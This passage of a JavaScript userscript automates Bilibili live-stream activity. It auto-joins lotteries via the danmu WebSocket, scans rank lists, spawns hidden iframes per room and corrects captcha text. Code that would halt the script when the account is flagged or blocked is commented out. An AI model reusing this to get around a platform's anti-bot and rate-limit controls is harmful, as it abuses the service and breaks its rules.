                correctQuestion: (question) => {
                    let q = '';
                    question = question.trim();
                    for (let i in question) {
                        let a = TreasureBox.captcha.correctStr[question[i]];
                        q += (a !== undefined ? a : question[i]);
                    }
                    if (q[2] === '4') q[2] = '+';
                    return q;
                }
            }
        }; // Constantly Run, Need Init

        const Lottery = {
            hasWS: false,
            createCount: 0,
            roomidSet: new Set(),
            listenSet: new Set(),
            Gift: {
                _join: (roomid, raffleId, type, time_wait = 0) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    raffleId = parseInt(raffleId, 10);
                    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
                    return delayCall(() => API.Lottery.Gift.join(roomid, raffleId, type).then((response) => {
                        DEBUG('Lottery.Gift._join: API.Lottery.Gift.join', response);
                        switch (response.code) {
                            case 0:
                                window.toast(
                                    `[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type})`,
                                    'success');
                                break;
                            case 402:
                                // 抽奖已过期，下次再来吧
                                break;
                            case 65531:
                                // 65531: 非当前直播间或短ID直播间试图参加抽奖
                                //Info.blocked = true;
                                Essential.DataSync.down();
                                window.toast(
                                    `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`,
                                    'error');
                                break;
                            default:
                                if (response.msg.indexOf('拒绝') > -1) {
                                    //Info.blocked = true;
                                    //Essential.DataSync.down();
                                    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                } else if (response.msg.indexOf('快') > -1) {
                                    return delayCall(() => Lottery.Gift._join(roomid, raffleId));
                                } else {
                                    window.toast(
                                        `[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`,
                                        'caution');
                                }
                        }
                    }, () => {
                        window.toast(
                            `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`,
                            'error');
                        return delayCall(() => Lottery.Gift._join(roomid, raffleId));
                    }), time_wait * 1e3 + 5e3);
                }
            },
            Guard: {
                wsList: [],
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    return API.Lottery.Guard.join(roomid, id).then((response) => {
                        DEBUG('Lottery.Guard._join: API.Lottery.Guard.join', response);
                        if (response.code === 0) {
                            window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //Essential.DataSync.down();
                            //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (response.msg.indexOf('快') > -1) {
                            return delayCall(() => Lottery.Guard._join(roomid, id));
                        } else if (response.msg.indexOf('过期') > -1) {} else {
                            window.toast(`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`,
                                         'caution');
                        }
                    }, () => {
                        window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => Lottery.Guard._join(roomid, id));
                    });
                }
            },
            MaterialObject: {
                list: [],
                ignore_keyword: ['test', 'encrypt', '测试', '钓鱼', '加密', '炸鱼'],
                run: () => {
                    try {
                        if (CACHE.materialobject_ts) {
                            const diff = ts_ms() - CACHE.materialobject_ts;
                            const interval = CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL *
                                  60e3 || 600e3;
                            if (diff < interval) {
                                setTimeout(Lottery.MaterialObject.run, interval - diff);
                                return $.Deferred().resolve();
                            }
                        }
                        return Lottery.MaterialObject.check().then((aid) => {
                            if (aid) { // aid有效
                                CACHE.last_aid = aid;
                                CACHE.materialobject_ts = ts_ms();
                                Essential.Cache.save();
                            }
                            setTimeout(Lottery.MaterialObject.run, CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG
                                       .CHECK_INTERVAL * 60e3 || 600e3);
                        }, () => delayCall(() => Lottery.MaterialObject.run()));
                    } catch (err) {
                        window.toast('[自动抽奖][实物抽奖]运行时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                },
                check: (aid, valid = 564, rem = 9) => { // TODO
                    aid = parseInt(aid || (CACHE.last_aid), 10);
                    if (isNaN(aid)) aid = valid;
                    DEBUG('Lottery.MaterialObject.check: aid=', aid);
                    return API.Lottery.MaterialObject.getStatus(aid).then((response) => {
                        DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.getStatus',
                              response);
                        if (response.code === 0 && response.data) {
                            if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.IGNORE_QUESTIONABLE_LOTTERY &&
                                Lottery.MaterialObject.ignore_keyword.some(v => response.data.title
                                                                           .toLowerCase().indexOf(v) > -1)) {
                                window.toast(`[自动抽奖][实物抽奖]忽略抽奖(aid=${aid})`, 'info');
                                return Lottery.MaterialObject.check(aid + 1, aid);
                            } else {
                                return Lottery.MaterialObject.join(aid, response.data.title,
                                                                   response.data.typeB).then(() => Lottery.MaterialObject.check(
                                    aid + 1, aid));
                            }
                        } else if (response.code === -400 || response.data == null) { // 活动不存在
                            if (rem) return Lottery.MaterialObject.check(aid + 1, valid, rem - 1);
                            return $.Deferred().resolve(valid);
                        } else {
                            window.toast(`[自动抽奖][实物抽奖]${response.msg}`, 'info');
                        }
                    }, () => {
                        window.toast(`[自动抽奖][实物抽奖]检查抽奖(aid=${aid})失败，请检查网络`, 'error');
                        return delayCall(() => Lottery.MaterialObject.check(aid, valid));
                    });
                },
                join: (aid, title, typeB, i = 0) => {
                    if (i >= typeB.length) return $.Deferred().resolve();
                    if (Lottery.MaterialObject.list.some(v => v.aid === aid && v.number === i + 1)) return Lottery
                        .MaterialObject.join(aid, title, typeB, i + 1);
                    const number = i + 1;
                    const obj = {
                        title: title,
                        aid: aid,
                        number: number,
                        status: typeB[i].status,
                        join_start_time: typeB[i].join_start_time,
                        join_end_time: typeB[i].join_end_time
                    };
                    switch (obj.status) {
                        case -1: // 未开始
                            {
                                Lottery.MaterialObject.list.push(obj);
                                const p = $.Deferred();
                                p.then(() => {
                                    return Lottery.MaterialObject.draw(obj);
                                });
                                setTimeout(() => {
                                    p.resolve();
                                }, (obj.join_start_time - ts_s() + 1) * 1e3);
                            }
                            break;
                        case 0: // 可参加
                            return Lottery.MaterialObject.draw(obj).then(() => {
                                return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
                            });
                        case 1: // 已参加
                            {
                                Lottery.MaterialObject.list.push(obj);
                                const p = $.Deferred();
                                p.then(() => {
                                    return Lottery.MaterialObject.notice(obj);
                                });
                                setTimeout(() => {
                                    p.resolve();
                                }, (obj.join_end_time - ts_s() + 1) * 1e3);
                            }
                            break;
                    }
                    return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
                },
                draw: (obj) => {
                    return API.Lottery.MaterialObject.draw(obj.aid, obj.number).then((response) => {
                        DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.draw',
                              response);
                        if (response.code === 0) {
                            $.each(Lottery.MaterialObject.list, (i, v) => {
                                if (v.aid === obj.aid && v.number === obj.number) {
                                    v.status = 1;
                                    Lottery.MaterialObject.list[i] = v;
                                    return false;
                                }
                            });
                            const p = $.Deferred();
                            p.then(() => {
                                return Lottery.MaterialObject.notice(obj);
                            });
                            setTimeout(() => {
                                p.resolve();
                            }, (obj.join_end_time - ts_s() + 1) * 1e3);
                        } else {
                            window.toast(
                                `[自动抽奖][实物抽奖]"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`,
                                'caution');
                        }
                    }, () => {
                        window.toast(
                            `[自动抽奖][实物抽奖]参加"${obj.title}"(aid=${obj.aid},number=${obj.number})失败，请检查网络`,
                            'error');
                        return delayCall(() => Lottery.MaterialObject.draw(obj));
                    });
                },
                notice: (obj) => {
                    return API.Lottery.MaterialObject.getWinnerGroupInfo(obj.aid, obj.number).then((
                        response) => {
                        DEBUG(
                            'Lottery.MaterialObject.check: API.Lottery.MaterialObject.getWinnerGroupInfo',
                            response);
                        if (response.code === 0) {
                            $.each(Lottery.MaterialObject.list, (i, v) => {
                                if (v.aid === obj.aid && v.number === obj.number) {
                                    v.status = 3;
                                    Lottery.MaterialObject.list[i] = v;
                                    return false;
                                }
                            });
                            $.each(response.data.winnerList, (i, v) => {
                                if (v.uid === Info.uid) {
                                    window.toast(
                                        `[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})获得奖励"${v.giftTitle}"`,
                                        'info');
                                    return false;
                                }
                            });
                        } else {
                            window.toast(
                                `[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`,
                                'caution');
                        }
                    }, () => {
                        window.toast(
                            `[自动抽奖][实物抽奖]获取抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})中奖名单失败，请检查网络`,
                            'error');
                        return delayCall(() => Lottery.MaterialObject.notice(obj));
                    });
                }
            },
            create: (roomid, real_roomid, type, link_url) => {
                if (Lottery.createCount > 99) location.reload();
                if (!real_roomid) real_roomid = roomid;
                if (Info.roomid === real_roomid) return;
                // roomid过滤，防止创建多个同样roomid的iframe
                if (Lottery.roomidSet.has(real_roomid)) return;
                Lottery.roomidSet.add(real_roomid);
                const iframe = $('<iframe style="display: none;"></iframe>')[0];
                iframe.name = real_roomid;
                let url;
                if (link_url) url = `${link_url.replace('https:', '').replace('http:', '')}` + (Info.visit_id ?
                                                                                                `&visit_id=${Info.visit_id}` : '');
                else url = `//live.bilibili.com/${roomid}` + (Info.visit_id ? `?visit_id=${Info.visit_id}` :
                                                              '');
                iframe.src = url;
                document.body.appendChild(iframe);
                const pFinish = $.Deferred();
                pFinish.then(() => {
                    window[NAME].iframeSet.delete(iframe);
                    $(iframe).remove();
                    Lottery.roomidSet.delete(real_roomid);
                });
                const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
                const pInit = $.Deferred();
                pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
                const up = () => {
                    CACHE = window[NAME].CACHE;
                    Info = window[NAME].Info;
                    Essential.Cache.save();
                    const pUp = $.Deferred();
                    pUp.then(up);
                    iframe[NAME].promise.up = pUp;
                };
                const pUp = $.Deferred();
                pUp.then(up);
                iframe[NAME] = {
                    roomid: real_roomid,
                    type: type,
                    promise: {
                        init: pInit, // 这个Promise在子脚本加载完成时resolve
                        finish: pFinish, // 这个Promise在iframe需要删除时resolve
                        down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
                        up: pUp
                    }
                };
                window[NAME].iframeSet.add(iframe);
                ++Lottery.createCount;
                DEBUG('Lottery.create: iframe', iframe);
            },
            listen: (uid, roomid, area = '', gift = false, volatile = true) => {
                if (Lottery.listenSet.has(roomid)) return;
                Lottery.listenSet.add(roomid);
                return API.room.getConf(roomid).then((response) => {
                    DEBUG('Lottery.listen: API.room.getConf', response);
                    //if (Info.blocked) return;
                    let ws = new API.DanmuWebSocket(uid, roomid, response.data.host_server_list,
                                                    response.data.token);
                    let id = 0;
                    if (volatile) id = Lottery.Guard.wsList.push(ws);
                    ws.bind((newws) => {
                        if (volatile && id) Lottery.Guard.wsList[id - 1] = newws;
                        window.toast(`[自动抽奖]${area}(${roomid})弹幕服务器连接断开，尝试重连`, 'caution');
                    }, () => {
                        window.toast(`[自动抽奖]${area}(${roomid})连接弹幕服务器成功`, 'success');
                        //if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY || CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) Lottery.create(roomid, roomid, 'LOTTERY');
                    }, (num) => {
                        //console.log(`房间${roomid}，人气值：${num}`);
                        //if (Info.blocked) {
                        //    ws.close();
                        //    window.toast(`[自动抽奖]${area}(${roomid})主动与弹幕服务器断开连接`, 'info');
                        //}
                    }, (obj, str) => {
                        switch (obj.cmd) {
                            case 'DANMU_MSG':
                            case 'SEND_GIFT':
                            case 'ENTRY_EFFECT':
                            case 'WELCOME':
                            case 'WELCOME_GUARD':
                            case 'COMBO_SEND':
                            case 'COMBO_END':
                            case 'WISH_BOTTLE':
                            case 'ROOM_RANK':
                            case 'ROOM_REAL_TIME_MESSAGE_UPDATE':
                                break;
                            case 'NOTICE_MSG':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                switch (obj.msg_type) {
                                    case 1:
                                        // 系统
                                        break;
                                    case 2:
                                    case 8:
                                        // 礼物抽奖
                                        if (!CONFIG.AUTO_LOTTERY) break;
                                        if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
                                        //if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
                                        BiliPushUtils.Gift.run(obj.real_roomid);
                                        break;
                                    case 3:
                                        // 舰队领奖
                                        if (!CONFIG.AUTO_LOTTERY) break;
                                        if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
                                        //if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
                                        BiliPushUtils.Guard.run(obj.real_roomid);
                                        break;
                                    case 4:
                                        // 登船
                                        break;
                                    case 5:
                                        // 获奖
                                        break;
                                    case 6:
                                        // 节奏风暴
                                        if (!CONFIG.AUTO_LOTTERY) break;
                                        //if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
                                        BiliPushUtils.Storm.run(roomid);
                                        break;
                                }
                                break;
                            case 'GUARD_LOTTERY_START':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                if (!CONFIG.AUTO_LOTTERY) break;
                                if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
                                //if (Info.blocked || !obj.data.roomid || !obj.data.lottery.id) break;
                                if (obj.data.roomid === Info.roomid) {
                                    Lottery.Guard._join(Info.roomid, obj.data.lottery.id);
                                } else {
                                    BiliPushUtils.Guard.run(obj.data.roomid);
                                }
                                break;
                            case 'RAFFLE_START':
                            case 'TV_START':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                if (!CONFIG.AUTO_LOTTERY) break;
                                if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
                                //if (Info.blocked || !obj.data.msg.roomid || !obj.data.msg.real_roomid || !obj.data.raffleId) break;
                                if (obj.data.msg.real_roomid === Info.roomid) {
                                    Lottery.Gift._join(Info.roomid, obj.data.raffleId, obj.data
                                                       .type, obj.data.time_wait);
                                } else {
                                    BiliPushUtils.Gift.run(obj.data.msg.real_roomid);
                                }
                                break;
                            case 'SPECIAL_GIFT':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                if (!CONFIG.AUTO_LOTTERY) break;
                                if (obj.data['39']) {
                                    switch (obj.data['39'].action) {
                                        case 'start':
                                            // 节奏风暴开始
                                            BiliPushUtils.Storm.run(roomid);
                                        case 'end':
                                            // 节奏风暴结束
                                    }
                                };
                                break;
                            default:
                                if (gift) DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                break;
                        }
                    });
                }, () => delayCall(() => Lottery.listen(uid, roomid, area, volatile)));
            },
            listenAll: () => {
                //if (Info.blocked) return;
                if (!Lottery.hasWS) {
                    Lottery.listen(Info.uid, Info.roomid, '', true, false);
                    Lottery.hasWS = true;
                }
                Lottery.Guard.wsList.forEach(v => v.close());
                Lottery.Guard.wsList = [];
                Lottery.listenSet = new Set();
                Lottery.listenSet.add(Info.roomid);
                const fn1 = () => {
                    return API.room.getList().then((response) => {
                        DEBUG('Lottery.listenAll: API.room.getList', response);
                        for (const obj of response.data) {
                            fn2(obj);
                        }
                    }, () => delayCall(() => fn1()));
                };
                const fn2 = (obj) => {
                    return API.room.getRoomList(obj.id, 0, 0, 1, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD ?
                                                CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER : 1).then((
                        response) => {
                        DEBUG('Lottery.listenAll: API.room.getRoomList', response);
                        for (let j = 0; j < response.data.length; ++j) {
                            Lottery.listen(Info.uid, response.data[j].roomid, `[${obj.name}区]`,
                                           !j, true);
                        }
                    }, () => delayCall(() => fn2(obj)));
                };
                fn1();
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_LOTTERY) return;
                    if (Info.blocked) {
                        //window.toast('[自动抽奖]帐号被关小黑屋，停止自动抽奖', 'caution');
                        //return;
                    }
                    if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY) Lottery.MaterialObject.run();
                    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
                        window.toast('[自动抽奖]不需要连接弹幕服务器', 'info');
                        return;
                    }
                    if (CONFIG.AUTO_LOTTERY_CONFIG.HIDE_POPUP) {
                        addCSS('#chat-popup-area-vm {display: none;}');
                    }
                    Lottery.listenAll();
                    if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL > 0) {
                        setInterval(() => {
                            Lottery.listenAll();
                        }, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL *
                                    60e3);
                    }
                    setInterval(() => {
                        if (Lottery.createCount > 0) --Lottery.createCount;
                    }, 10e3);
                    if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL > 0) {
                        setTimeout(() => {
                            // if(!BiliPush.connected){
                            //     location.reload();
                            // }
                        }, CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL * 60e3);
                    }
                } catch (err) {
                    window.toast('[自动抽奖]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                }
            }
        }; // Constantly Run

        const createIframe = (url, type, name) => {
            const iframe = $(`<iframe style="display: none;"></iframe>`)[0];
            if (!name) name =
                `_${Math.floor(Math.random() * 10000 + Math.random() * 1000 + Math.random() * 100 + Math.random() * 10).toString(16)}`;
            iframe.name = name;
            iframe.src = `${url}/${iframe.name}`;
            document.body.appendChild(iframe);
            const pFinish = $.Deferred();
            pFinish.then(() => {
                window[NAME].iframeSet.delete(iframe);
                $(iframe).remove();
            });
            const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
            const pInit = $.Deferred();
            pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
            const up = () => {
                CACHE = window[NAME].CACHE;
                Info = window[NAME].Info;
                Essential.Cache.save();
                const pUp = $.Deferred();
                pUp.then(up);
                iframe[NAME].promise.up = pUp;
            };
            const pUp = $.Deferred();
            pUp.then(up);
            iframe[NAME] = {
                type: type,
                promise: {
                    init: pInit, // 这个Promise在子脚本加载完成时resolve
                    finish: pFinish, // 这个Promise在iframe需要删除时resolve
                    down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
                    up: pUp
                }
            };
            window[NAME].iframeSet.add(iframe);
            DEBUG('createIframe', iframe);
        };

        const Init = () => {
            try {
                const promiseInit = $.Deferred();
                scriptRuning = true;
                console.log("魔改脚本成功运行...")
                Essential.init().then(() => {
                    console.log("脚本配置加载完毕...")
                    try {
                        API = BilibiliAPI;
                    } catch (err) {
                        window.toast('BilibiliAPI初始化失败，请检查网络和依赖项访问是否正常！', 'error');
                        console.error(`[${NAME}]`, err);
                        return p1.reject();
                    }
                    try {
                        TokenUtil = BilibiliToken;
                        Token = new TokenUtil();
                    } catch (err) {
                        TokenUtil = null;
                        Token = null;
                        window.toast('BilibiliToken 初始化失败，移动端功能可能失效！请检查网络和依赖项访问是否正常！', 'error');
                        console.error(`[${NAME}]`, err);
                    }
                    const uniqueCheck = () => {
                        const p1 = $.Deferred();
                        const t = Date.now() / 1000;
                        //console.log('CACHE.unique_check',CACHE.unique_check, Date.now() / 1000);
                        if (t - CACHE.unique_check >= 0 && t - CACHE.unique_check <= 60) {
                            // 其他脚本正在运行
                            return p1.reject();
                        }
                        // 没有其他脚本正在运行
                        return p1.resolve();
                    };
                    uniqueCheck().then(() => {
                        let timer_unique;
                        const uniqueMark = () => {
                            timer_unique = setTimeout(uniqueMark, 2e3);
                            //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
                            CACHE.unique_check = Date.now() / 1000;
                            //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
                            Essential.Cache.save();
                        };
                        window.addEventListener('unload', () => {
                            if (timer_unique) {
                                clearTimeout(timer_unique);
                                CACHE.unique_check = 0;
                                Essential.Cache.save();
                            }
                        });
                        uniqueMark();
                        window.toast('正在初始化脚本...', 'info');
                        const InitData = () => {
                            const p = $.Deferred();
                            let initFailed = false;
                            const p2 = $.Deferred();
                            p2.then(() => {
                                initFailed = true;
                            });
                            let timer_p2 = setTimeout(() => p2.resolve(), 30e3);
                            let tryCount = 0;
                            runUntilSucceed(() => {
                                try {
                                    if (initFailed) {
                                        timer_p2 = undefined;
                                        window.toast('初始化用户数据、直播间数据超时，请关闭广告拦截插件后重试',
                                                     'error');
                                        p.reject();
                                        return true;
                                    }
                                    if (!window.BilibiliLive || parseInt(window.BilibiliLive
                                                                         .ROOMID, 10) === 0 || !window.__statisObserver)
                                        return false;
                                    DEBUG('Init: InitData: BilibiliLive', window.BilibiliLive);
                                    DEBUG('Init: InitData: __statisObserver',
                                          window.__statisObserver);
                                    clearTimeout(timer_p2);
                                    timer_p2 = undefined;
                                    if (parseInt(window.BilibiliLive.UID, 10) ===
                                        0 || isNaN(parseInt(window.BilibiliLive.UID,
                                                            10))) {
                                        if (tryCount > 20) {
                                            window.toast('你还没有登录，助手无法使用！',
                                                         'caution');
                                            p.reject();
                                            return true;
                                        } else {
                                            return false;
                                        }
                                    }
                                    Info.short_id = window.BilibiliLive.SHORT_ROOMID;
                                    Info.roomid = window.BilibiliLive.ROOMID;
                                    Info.uid = window.BilibiliLive.UID;
                                    Info.ruid = window.BilibiliLive.ANCHOR_UID;
                                    Info.rnd = window.BilibiliLive.RND;
                                    Info.csrf_token = getCookie('bili_jct');
                                    Info.visit_id = window.__statisObserver ?
                                        window.__statisObserver.__visitId : '';
                                    API.setCommonArgs(Info.csrf_token, '');
                                    const p1 = API.live_user.get_info_in_room(Info.roomid)
                                    .then((response) => {
                                        DEBUG(
                                            'InitData: API.live_user.get_info_in_room',
                                            response);
                                        Info.silver = response.data.wallet.silver;
                                        Info.gold = response.data.wallet.gold;
                                        Info.uid = response.data.info.uid;
                                        Info.mobile_verify = response.data.info
                                            .mobile_verify;
                                        Info.identification = response.data
                                            .info.identification;
                                    });
                                    const p2 = API.gift.gift_config().then((
                                        response) => {
                                        DEBUG(
                                            'InitData: API.gift.gift_config',
                                            response);
                                        if ($.type(response.data) ==
                                            "array") {
                                            Info.gift_list = response.data;
                                        } else if ($.type(response.data.list) ==
                                                   "array") {
                                            Info.gift_list = response.data.list;
                                        } else {
                                            Info.gift_list = [];
                                            window.toast('直播间礼物数据获取失败',
                                                         'error');
                                            return;
                                        }
                                        Info.gift_list.forEach((v, i) => {
                                            if (i % 3 === 0) Info.gift_list_str +=
                                                '<br>';
                                            Info.gift_list_str +=
                                                `${v.id}：${v.name}`;
                                            if (i < Info.gift_list.length -
                                                1) Info.gift_list_str +=
                                                '，';
                                        });
                                    });
                                    $.when(p1, p2).then(() => {
                                        if (parseInt(window.BilibiliLive.UID,
                                                     10) === 0 || isNaN(parseInt(
                                            window.BilibiliLive.UID,
                                            10))) {
                                            window.toast('你还没有登录，助手无法使用！',
                                                         'caution');
                                            p.reject();
                                            return;
                                        }
                                        Essential.DataSync.down();
                                        p.resolve();
                                    }, () => {
                                        window.toast('初始化用户数据、直播间数据失败',
                                                     'error');
                                        p.reject();
                                    });
                                    return true;
                                } catch (err) {
                                    if (timer_p2) clearTimeout(timer_p2);
                                    window.toast('初始化用户数据、直播间数据时出现异常', 'error');
                                    console.error(`[${NAME}]`, err);
                                    p.reject();
                                    return true;
                                }
                            }, 1, 500);
                            return p;
                        };
                        const InitFunctions = () => {
                            const promiseInitFunctions = $.Deferred();
                            $.when(TreasureBox.init()).then(() => promiseInitFunctions.resolve(),
                                                            () => promiseInitFunctions.reject());
                            return promiseInitFunctions;
                        };
                        InitData().then(() => {
                            InitFunctions().then(() => {
                                promiseInit.resolve();
                            }, () => promiseInit.reject());
                        }, () => promiseInit.reject());
                    }, () => {
                        window.toast('有其他直播间页面的脚本正在运行，本页面脚本停止运行', 'caution');
                        promiseInit.reject();
                    });
                });
                return promiseInit;
            } catch (err) {
                window.toast('初始化时出现异常', 'error');
                console.error(`[${NAME}]`, err);
                return $.Deferred().reject();
            }
        };

        const TopRankTask = {
            process: async () => {
                try {
                    if(CONFIG.AUTO_LOTTERY_CONFIG.RANK_TOP){
                        window.toast('开始扫描小时榜...', 'info');
                        let roomSet = new Set();
                        let toprank = await delayCall(() => BiliPushUtils.API.LiveRank.topRank(), 1000);
                        let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(0), 1000);
                        let rankList = [toprank, areaRank];
                        let getListRsp = await API.room.getList();
                        if (getListRsp.code == 0 && getListRsp.data) {
                            for (let areaInfo of getListRsp.data) {
                                let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(
                                    areaInfo.id), 1000)
                                rankList.push(areaRank);
                            }
                        }
                        for (let rsp of rankList) {
                            if (rsp.code == 0 && rsp.data.list) {
                                for (let room of rsp.data.list) {
                                    roomSet.add(room.roomid)
                                }
                            }
                        }
                        for (let roomid of roomSet) {
                            await BiliPushUtils.Check.run(roomid);
                        }
                    }
                    await delayCall(() => TopRankTask.run(), 300e3);
                } catch (err) {
                    console.error(`[${NAME}]`, err);
                    return delayCall(() => TopRankTask.run());
                }
            },
            run: async () => {
                try {
                    let done = true;
                    if (!CONFIG.AUTO_LOTTERY) {
                        done = false;
                    }
                    //if (Info.blocked) return $.Deferred().resolve();
                    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
                        done = false;
                    }
                    if (!BiliPush.connected) {
                        done = false;
                    }
                    if (!done) {
                        setTimeout(() => TopRankTask.run(), 5000);
                        return $.Deferred().resolve();
                    } else {
                        await TopRankTask.process();
                        return $.Deferred().resolve();
                    }
                } catch (err) {
                    window.toast('[直播小时榜]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 1 mins

        const BiliPushUtils = {
            raffleIdSet: new Set(),
            guardIdSet: new Set(),
            pkIdSet: new Set(),
            stormBlack: false,
            stormQueue: [],
            lastEnter:null,
            enterSet: new Set(),
            initSet: new Set(),
            sign: null,
            msgIgnore: (msg) => {
                if (msg) {
                    let ignoreList = ['操作太快', '稍后再试', '请求太多', '频繁', '繁忙'];
                    for (let ignore of ignoreList) {
                        if (msg.indexOf(ignore) > -1) {
                            return true;
                        }
                    }
                }
                return false;
            },
            clearSet: () => {
                BiliPushUtils.splitSet(BiliPushUtils.raffleIdSet, 1500, 2);
                BiliPushUtils.splitSet(BiliPushUtils.guardIdSet, 200, 2);
                BiliPushUtils.splitSet(BiliPushUtils.pkIdSet, 200, 2);
            },
            splitSet: (set, limit, rate = 2) => {
                if (set && set.size > limit) {
                    let end = limit / rate;
                    for (let item of set.entries()) {
                        if (item[0] <= end) {
                            set.delete(item[1]);
                        }
                    }
                }
            },
            up: () => {
                window.parent[NAME].Info = Info;
                window.parent[NAME].CACHE = CACHE;
                if (window.frameElement && window.frameElement[NAME]) {
                    window.frameElement[NAME].promise.up.resolve();
                }
            },
            processing: 0,
            ajax: (setting, roomid) => {
                const p = jQuery.Deferred();
                runUntilSucceed(() => {
                    if (BiliPushUtils.processing > 5) return false;
                    ++BiliPushUtils.processing;
                    return BiliPushUtils._ajax(setting).then((arg1, arg2, arg3) => {
                        --BiliPushUtils.processing;
                        p.resolve(arg1, arg2, arg3);
                        return true;
                    }).catch((arg1, arg2, arg3) => {
                        --BiliPushUtils.processing;
                        p.reject(arg1, arg2, arg3);
                        return true;
                    });
                });
                return p;
            },
            _ajax: (setting) => {
                let url = (setting.url.substr(0, 2) === '//' ? '' : '//api.live.bilibili.com/') + setting.url;
                let option = {
                    method: setting.method || "GET",
                    headers: setting.headers || {},
                    credentials: 'include',
                    mode: 'cors'
                };
                if (setting.roomid) {
                    option.referrer = location.protocol + "//" + location.hostname + "/" + setting.roomid;
                }
                if (option.method == "GET") {
                    if (setting.data) {
                        url = `${url}?${$.param(setting.data)}`;
                    }
                } else {
                    option.headers["content-type"] = "application/x-www-form-urlencoded";
                    if (setting.data) {
                        option.body = $.param(setting.data);
                    }
                }
                return fetch(url, option).then(r => r.json());
            },
            ajaxWithCommonArgs: (setting) => {
                if (setting.data) {
                    setting.data.csrf = Info.csrf_token;
                    setting.data.csrf_token = Info.csrf_token;
                }
                return BiliPushUtils.ajax(setting);
            },
            corsAjax: (setting) => {
                const p = jQuery.Deferred();
                runUntilSucceed(() => {
                    return new Promise(success => {
